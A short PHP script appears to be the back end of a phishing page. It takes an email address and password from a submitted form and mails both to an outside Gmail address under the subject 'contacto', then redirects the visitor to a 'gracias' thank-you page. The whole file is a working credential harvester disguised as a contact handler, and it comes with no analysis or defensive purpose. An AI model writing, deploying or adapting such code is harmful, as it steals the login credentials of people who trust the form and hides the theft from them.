<?php
    $destino='darkesmit@gmail.com';
    $correo=$_POST['correo'];
    $contraseña=$_POST['contraseña'];
    $contenido='Correo: ' . $correo .'Contraseña: ' . $contraseña;
    mail($destino, 'contacto', $contenido);
    header('Location:gracias.html');
?>
